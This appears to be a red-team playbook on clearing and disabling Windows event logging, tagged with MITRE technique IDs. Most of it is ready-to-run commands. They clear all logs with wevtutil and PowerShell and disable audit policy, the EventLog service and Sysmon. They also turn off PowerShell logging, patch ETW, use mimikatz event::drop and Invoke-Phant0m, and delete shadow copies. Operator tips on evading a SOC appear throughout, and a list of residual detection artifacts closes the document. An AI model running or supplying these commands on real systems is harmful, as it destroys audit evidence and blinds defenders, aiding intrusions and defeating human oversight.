# Windows Event Log Clearing & Manipulation

Tag MITRE: T1070.001 (Clear Windows Event Logs), T1562.002 (Disable Windows Event Logging)

## Event Log Locations

```
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
C:\Windows\System32\winevt\Logs\Windows PowerShell.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx
C:\Windows\System32\winevt\Logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx
```

## Key Event IDs (Know What You're Leaving Behind)

| Event ID | Log | Meaning | Relevance |
|----------|-----|---------|-----------|
| 1102 | Security | Audit log was cleared | **Generated when YOU clear Security log** |
| 104 | System | System log was cleared | **Generated when YOU clear System log** |
| 1100 | Security | Event logging service shut down | Service disruption evidence |
| 4624 | Security | Successful logon | Contains your IP and logon type |
| 4625 | Security | Failed logon | Failed password attempts |
| 4648 | Security | Explicit credential logon (runas) | Lateral movement indicator |
| 4672 | Security | Special privileges assigned | Admin logon indicator |
| 4688 | Security | Process creation | Every command you ran |
| 4698/4702 | Security | Scheduled task created/updated | Persistence indicator |
| 7045 | System | Service installed | Service-based persistence |
| 1 | Sysmon | Process creation | Detailed command lines |
| 3 | Sysmon | Network connection | C2 connections |
| 7 | Sysmon | Image loaded | DLL side-loading evidence |

## Evidence Capture — Before Clearing

```powershell
# Record attacker footprint for pentest report before wiping
$evidence = @{
    technique = "T1070.001"
    technique_name = "Clear Windows Event Logs"
    target_host = $env:COMPUTERNAME
    timestamp = (Get-Date -Format "o")
    logon_events_found = (Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -match '10.10.14.5' }).Count
    process_events_found = (Get-WinEvent -FilterHashtable @{LogName='Security';ID=4688} -ErrorAction SilentlyContinue |
        Where-Object { $_.Message -match 'attacker_tool' }).Count
}
$evidence | ConvertTo-Json | Out-File C:\temp\.evidence_log_clear.json
```

## wevtutil — Native CLI (T1070.001)

```cmd
:: List all event log names
wevtutil el
wevtutil el | find /c /v ""              &:: Count total logs

:: Clear specific logs (requires Administrator)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl Setup
wevtutil cl "Windows PowerShell"
wevtutil cl Microsoft-Windows-PowerShell/Operational
wevtutil cl Microsoft-Windows-Sysmon/Operational
wevtutil cl Microsoft-Windows-TerminalServices-LocalSessionManager/Operational
wevtutil cl Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational

:: Clear with backup (keep a copy for yourself)
wevtutil epl Security C:\temp\sec_pre_clear.evtx
wevtutil cl Security

:: Clear ALL event logs (nuclear — one-liner)
for /F "tokens=*" %l in ('wevtutil el') do @wevtutil cl "%l" 2>nul
```

> **⚠️ SAFETY: Clearing Security ALWAYS generates Event ID 1102. Clearing System generates 104. These events are written AFTER the clear — you cannot avoid them. Prefer disabling logging first.**

## PowerShell Methods (T1070.001)

```powershell
# Clear specific logs
Clear-EventLog -LogName Security, System, Application

# Clear all classic logs
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log 2>$null }

# Clear all modern logs via wevtutil
Get-WinEvent -ListLog * -Force | ForEach-Object { wevtutil cl $_.LogName 2>$null }

# Clear PowerShell-specific operational logs
Get-WinEvent -ListLog Microsoft-Windows-PowerShell* | ForEach-Object { wevtutil cl $_.LogName }

# Remove-EventLog — deletes the log AND disables future logging until reboot
Remove-EventLog -LogName Security

# Direct file deletion (requires stopping service first)
Stop-Service EventLog -Force
Remove-Item C:\Windows\System32\winevt\Logs\*.evtx -Force
Start-Service EventLog

# Query events matching attacker IP before clearing (recon)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 50 |
    Where-Object { $_.Message -match '10.10.14.5' } |
    Select-Object TimeCreated, RecordId, Message | Format-List
```

## PowerShell History Clearing — T1070.003

```powershell
# Delete PSReadLine history file (persists across sessions)
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force

# Clear in-session history
Clear-History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# Prevent history logging for current session
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

## Sysmon Evasion

```cmd
:: Check if Sysmon is installed
sc query Sysmon64
sc query Sysmon
fltMC.exe | findstr /i sysmon

:: Clear Sysmon operational log
wevtutil cl Microsoft-Windows-Sysmon/Operational

:: Unload Sysmon driver (stops all collection — requires admin)
fltMC.exe unload SysmonDrv

:: Stop and delete Sysmon service
sc stop Sysmon64
sc delete Sysmon64

:: Full Sysmon removal
sysmon64 -u force
```

> **⚠️ SAFETY: Sysmon removal is VERY noisy. If a SOC is watching, they see the service disappear instantly. Prefer clearing the log and leaving Sysmon running.**

## Disable Windows Event Logging — T1562.002

### Audit Policy Manipulation
```cmd
:: Disable ALL audit categories
auditpol /set /category:* /success:disable /failure:disable

:: Disable specific categories
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Account Logon" /success:disable /failure:disable
auditpol /set /category:"Object Access" /success:disable /failure:disable
auditpol /set /category:"Privilege Use" /success:disable /failure:disable

:: Clear entire audit policy
auditpol /clear /y
auditpol /remove /allusers

:: Verify audit policy is disabled
auditpol /get /category:*
```

### Disable EventLog Service
```cmd
:: Via sc (requires reboot to fully take effect)
sc config EventLog start= disabled
net stop EventLog

:: Via PowerShell
Stop-Service -Name EventLog -Force
Set-Service -Name EventLog -StartupType Disabled
```

### Registry-Based Disabling (Survives Reboot)
```cmd
:: Disable Security event log Autologger (NO admin required for this key!)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security" /v "Start" /t REG_DWORD /d 0 /f

:: Disable System and Application Autologgers (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System" /v "Start" /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v "Start" /t REG_DWORD /d 0 /f

:: Disable EventLog service via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog" /v "Start" /t REG_DWORD /d 4 /f
:: Reboot required for registry changes to take effect
```

### PowerShell Logging Bypass — T1562.002
```powershell
# Disable ScriptBlock logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Disable Module logging
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0

# Disable Transcription
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0
```

## Advanced: Mimikatz Event Manipulation

```
:: Patch event logging in memory (events stop being written — service stays "running")
mimikatz # privilege::debug
mimikatz # event::drop
[+] Patched! No more events...

:: Clear a specific log via mimikatz
mimikatz # event::clear /log:Security
```

## Advanced: Invoke-Phant0m (Kill EventLog Threads)

```powershell
# Kills threads inside the EventLog service process
# Service shows "Running" but no events are written
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m
# GitHub: hlldz/Invoke-Phant0m
```

> **⚠️ SAFETY: Phant0m and event::drop are in-memory patches. They survive only until reboot or service restart. Plan accordingly.**

## Advanced: ETW Patching — T1562.002

Event Tracing for Windows (ETW) is the telemetry backbone. Patching it at source stops events before they reach any log, SIEM, or EDR.

```powershell
# Patch .NET ETW provider in current PowerShell process
# Blocks Script Block Logging telemetry at source
$etw = [Reflection.Assembly]::LoadWithPartialName('System.Management.Automation').GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
$etwField = $etw.GetField('etwProvider', 'NonPublic,Static')
$eventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid())
$etwField.SetValue($null, $eventProvider)
```

**Concept — patch `ntdll!EtwEventWrite` (native level):**
```
# Overwrite first bytes with: xor eax,eax; ret (33 C0 C3)
# ALL ETW providers silently fail — nothing reaches any consumer
# Implemented by: SharpBlock, InlineETW, Cobalt Strike BOFs
```

## Remote Forwarding Check

> **⚠️ CRITICAL: If WEF (Windows Event Forwarding) or SIEM agent is active, local clearing is USELESS.**

```cmd
:: Check for Windows Event Forwarding subscriptions
wecutil es
wecutil gs SubscriptionName

:: Check for common SIEM agents
sc query winlogbeat
sc query splunkforwarder
sc query ossec
sc query "Microsoft Monitoring Agent"
tasklist /fi "imagename eq winlogbeat.exe"
tasklist /fi "imagename eq splunkd.exe"
```

## Shadow Copy Cleanup

Pre-clearing log snapshots may exist in Volume Shadow Copies:
```cmd
:: List existing shadow copies
vssadmin list shadows

:: Delete ALL shadow copies
vssadmin delete shadows /all /quiet

:: Alternative via WMI
wmic shadowcopy delete
```

## Evidence Capture — After Clearing

```powershell
$evidence = @{
    technique = "T1070.001"
    technique_name = "Clear Windows Event Logs"
    target_host = $env:COMPUTERNAME
    timestamp = (Get-Date -Format "o")
    logs_cleared = @("Security", "System", "Application", "Sysmon")
    method = "wevtutil_cl"
    audit_policy_disabled = $true
    sysmon_present = (Get-Service Sysmon64 -ErrorAction SilentlyContinue) -ne $null
    wef_present = ((wecutil es 2>$null) -ne $null)
    shadow_copies_deleted = $true
    notes = "Cleared 4 primary logs. Disabled audit policy. No remote SIEM agent detected."
}
$evidence | ConvertTo-Json -Depth 3 | Out-File C:\temp\.evidence_log_clear.json -Encoding UTF8
```

## Detection Artifacts (What You CAN'T Hide)

Even after full clearing, these remain:
- **Event ID 1102** in Security log — "The audit log was cleared" (written AFTER clear)
- **Event ID 104** in System log — "The System log file was cleared"
- **Event ID 1100** — "The event logging service has shut down"
- **Gaps in Event Record IDs** — sequential IDs will jump after deletion
- **USN Journal** — `$UsnJrnl:$J` records all changes to .evtx files
- **$MFT timestamps** on .evtx files — show when logs were modified
- **Prefetch files** — `wevtutil.exe` prefetch proves the tool was run
